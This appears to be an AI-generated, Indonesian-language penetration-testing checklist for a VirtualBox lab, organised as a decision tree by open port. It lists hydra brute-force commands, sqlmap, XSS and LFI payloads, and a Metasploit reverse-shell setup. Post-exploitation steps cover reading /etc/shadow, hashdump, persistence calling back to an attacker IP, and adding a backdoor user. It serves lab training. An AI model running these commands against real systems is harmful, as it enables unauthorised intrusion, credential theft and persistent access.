@@ -1,0 +1,182 @@
+
+# BLACKBOX PENTEST DECISION TREE WORKFLOW (KALI LINUX OFFLINE)
+
+1. Identifikasi Target
+
+---
+
+* Temukan host aktif dalam jaringan VirtualBox:
+  netdiscover -r 192.168.56.0/24
+  atau
+  arp-scan -l
+
+* Catat IP target → misal 192.168.56.101
+
+2. Port Scanning & Service Detection
+
+---
+
+* Scan semua port:
+  nmap -p- -T4 192.168.56.101
+
+* Scan detail dengan service & OS detection:
+  nmap -sV -O -p <open-ports> 192.168.56.101
+
+* Simpan hasil:
+  nmap -A -oN nmap\_result.txt 192.168.56.101
+
+3. Keputusan Berdasarkan Port
+
+---
+
+(cek port terbuka lalu ikuti tool eksploitasi yang sesuai)
+
+### Jika FTP (21) terbuka
+
+* Coba login anonymous:
+  ftp 192.168.56.101 (user: anonymous, pass kosong)
+* Jika butuh brute force:
+  hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp\://192.168.56.101
+
+### Jika SSH (22) terbuka
+
+* Coba brute force user/password:
+  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101
+* Jika dapat kredensial → ssh root\@192.168.56.101
+
+### Jika Telnet (23) terbuka
+
+* Sama seperti SSH → coba hydra brute force.
+
+### Jika SMTP (25, 587) terbuka
+
+* Cek relay open:
+  nmap --script smtp-open-relay 192.168.56.101
+* Enum user:
+  smtp-user-enum -M VRFY -U /usr/share/wordlists/user.txt -t 192.168.56.101
+
+### Jika HTTP/HTTPS (80/443/8080) terbuka
+
+* Cek manual dengan browser: [http://192.168.56.101](http://192.168.56.101)
+* Jalankan nikto scan:
+  nikto -h [http://192.168.56.101](http://192.168.56.101)
+* Enumerasi direktori:
+  gobuster dir -u [http://192.168.56.101](http://192.168.56.101) -w /usr/share/wordlists/dirb/common.txt
+  ffuf -u [http://192.168.56.101/FUZZ](http://192.168.56.101/FUZZ) -w /usr/share/wordlists/dirb/common.txt
+* Uji SQL Injection:
+  sqlmap -u "[http://192.168.56.101/index.php?id=1](http://192.168.56.101/index.php?id=1)" --dbs
+* Uji XSS:
+
+  <script>alert(1)</script>  
+* Uji LFI/RFI:
+  ?page=../../../../etc/passwd
+
+### Jika SMB (139/445) terbuka
+
+* Enum share:
+  smbclient -L \\\192.168.56.101\\
+* Enum user/password:
+  enum4linux -a 192.168.56.101
+* Coba brute force login SMB:
+  hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.56.101
+
+### Jika MySQL/MariaDB (3306) terbuka
+
+* Coba login default:
+  mysql -u root -p -h 192.168.56.101
+* Jika butuh brute force:
+  hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.56.101
+
+### Jika RDP (3389) terbuka (jika target Windows)
+
+* Brute force dengan hydra:
+  hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp\://192.168.56.101
+
+### Jika Service lain terbuka (nmap menemukan CVE)
+
+* Cari exploit offline dengan searchsploit:
+  searchsploit <service>
+  searchsploit CVE-xxxx-xxxx
+* Copy exploit:
+  searchsploit -m exploit/path
+
+4. Exploitation
+
+---
+
+* Gunakan Metasploit jika ada modul:
+  msfconsole
+  search <vuln-name>
+  use exploit/...
+  set RHOSTS 192.168.56.101
+  set PAYLOAD windows/meterpreter/reverse\_tcp
+  set LHOST <attacker-ip>
+  exploit
+
+* Upload reverse shell jika ada file upload vuln.
+
+* Jalankan manual exploit hasil searchsploit (C, Python).
+
+5. Post-Exploitation
+
+---
+
+Jika reverse shell / meterpreter berhasil:
+
+* Cek informasi sistem:
+  sysinfo
+  uname -a
+  whoami
+
+* Cek file sensitif:
+  cat /etc/passwd
+  cat /etc/shadow
+  type C:\Windows\win.ini
+
+* Dump password hash (Windows):
+  hashdump
+
+* Crack password hash dengan john:
+  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+* Privilege escalation (Metasploit):
+  use post/multi/recon/local\_exploit\_suggester
+  run
+
+6. Maintaining Access (Opsional, Lab Only)
+
+---
+
+* Persistence di meterpreter:
+  run persistence -U -i 5 -p 4444 -r <attacker-ip>
+
+* Tambahkan user (Linux):
+  useradd attacker -m -s /bin/bash
+  echo 'attacker\:password' | chpasswd
+
+7. Cleanup & Dokumentasi
+
+---
+
+* Hapus user/backdoor jika dibuat.
+* Dokumentasikan:
+
+  * IP target
+  * Port & service
+  * Kerentanan
+  * Exploit & hasil
+  * Privilege escalation
+* Kembalikan VM ke snapshot awal.
+
+---
+
+## TIPS
+
+* Workflow dasar: **Discover → Enum → Exploit → Post-Exploitation → Cleanup**.
+* Jika menemukan service asing → cek banner dengan nmap -sV lalu cari exploit di searchsploit.
+* Semua wordlists sudah ada di Kali (/usr/share/wordlists/).
+* Gunakan snapshot VirtualBox sebelum exploit untuk rollback.
+
+---
+
+Mau saya buatkan versi **diagram alur (ASCII decision tree)** biar lebih visual (misal: “port 21 → FTP → hydra; port 80 → nikto/sqlmap/gobuster”)?
